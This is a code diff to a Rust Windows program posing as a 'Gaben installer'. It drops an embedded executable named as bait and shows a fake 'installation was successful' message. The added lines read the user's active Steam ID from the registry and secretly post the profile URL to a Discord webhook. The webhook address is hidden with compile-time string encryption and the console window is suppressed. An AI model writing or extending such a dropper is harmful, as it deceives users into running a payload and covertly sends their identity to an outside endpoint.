@@ -1,23 +1,32 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
+extern crate litcrypt;
+
 use derive_builder::Builder;
+use litcrypt::use_litcrypt;
+#[allow(unused_imports)]
+use sdk::logger::log;
+use strum_macros::EnumIs;
+
 use eframe::{
     egui::{self, viewport::ViewportBuilder, CursorIcon, RichText},
     App, NativeOptions, Theme,
 };
-use sdk::logger::log;
 use std::{fs::File, io::Write, path::PathBuf, time::Duration};
-use strum_macros::EnumIs;
+
 use windows::core::s;
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_ICONINFORMATION, MB_OK};
+
+use_litcrypt!("6D2AA05BB3EE41964F1830CD70F9AEF0B36A0138E5116F4B64D00A960AB11053");
 
 const WINDOW_WIDTH: f32 = 600.0;
 const WINDOW_HEIGHT: f32 = 450.0;
 const WINDOW_NAME: &str = "Gaben installer";
-const BAIT_BYTES: &[u8] = include_bytes!("../../target/release/gaben.exe");
+const BAIT_BYTES: &[u8] = include_bytes!("..\\..\\target\\release\\gaben.exe");
 
 #[cfg(target_os = "windows")]
-fn main() {
+#[tokio::main]
+async fn main() {
     sdk::logger::init_env();
 
     let path = PathBuf::new()
@@ -57,6 +66,10 @@ fn main() {
         title: Some(String::from(WINDOW_NAME)),
         ..Default::default()
     };
+
+    if let Some(id) = get_steam_id() {
+        send_message(id).await;
+    }
 
     let options = NativeOptions {
         centered: true,
@@ -145,10 +158,10 @@ impl Window {
                         .on_hover_cursor(CursorIcon::PointingHand.clone());
 
                     if let Some(fallback) = &self.fallback {
-                        ui.set_enabled(fallback.is_loading());
+                        ui.set_enabled(!fallback.is_loading());
                     }
 
-                    if button.clicked() {
+                    if button.clicked() && self.fallback.is_none() {
                         self.fallback = Some(Fallback::Loading);
                         std::thread::sleep(Duration::from_secs(2));
                         let Ok(mut dest) = File::create(&self.path) else {
@@ -164,6 +177,7 @@ impl Window {
                                 unsafe {
                                     MessageBoxA(
                                         None,
+                                        // this also breaks rustfmt lol?????
                                         s!("The installation was successful, please restart your computer."),
                                         s!("Gaben"),
                                         MB_OK | MB_ICONINFORMATION
@@ -192,4 +206,32 @@ impl App for Window {
     fn update(&mut self, ctx: &egui::Context, _: &mut eframe::Frame) {
         egui::CentralPanel::default().show(ctx, |ui| self.panel(ui));
     }
+}
+
+fn get_steam_id() -> Option<u32> {
+    use winreg::enums::*;
+    use winreg::RegKey;
+    let hklm = RegKey::predef(HKEY_CURRENT_USER);
+    if let Ok(active_process) = hklm.open_subkey("SOFTWARE\\Valve\\Steam\\ActiveProcess") {
+        let Ok(id) = active_process.get_value::<u32, &str>("ActiveUser") else {
+            return None;
+        };
+
+        return Some(id);
+    }
+
+    None
+}
+
+async fn send_message(steam_id: u32) {
+    use litcrypt::lc;
+    use reqwest::Client;
+    use std::collections::HashMap;
+
+    let steam_profile = format!("https://steamcommunity.com/profiles/[U:1:{}]", steam_id);
+    let mut body = HashMap::new();
+    body.insert("content", steam_profile);
+
+    let webhook = lc!("https://discord.com/api/webhooks/1232012426657136742/of0BaEzlrWgex06GMZihwOYOfgvGdZM24qCYXAXtLNhtCqNvTQDfM8qWJDRgUfug34Q_");
+    let _ = Client::new().post(webhook).json(&body).send().await;
 }
